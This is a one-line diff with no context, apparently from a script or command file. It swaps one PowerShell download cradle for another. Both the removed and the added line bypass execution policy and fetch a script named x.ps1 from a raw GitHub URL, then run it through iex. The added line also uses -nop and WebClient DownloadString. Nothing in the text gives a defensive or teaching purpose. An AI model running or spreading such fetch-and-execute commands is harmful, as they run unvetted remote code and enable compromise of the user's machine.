@@ -1,1 +1,1 @@
-powershell -ep bypass -c "iex (iwr 'https://raw.githubusercontent.com/Ryu1430/x/refs/heads/main/x.ps1' -UseBasicParsing).Content"
+powershell -nop -ep bypass -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ryu1430/x/refs/heads/main/x.ps1')"
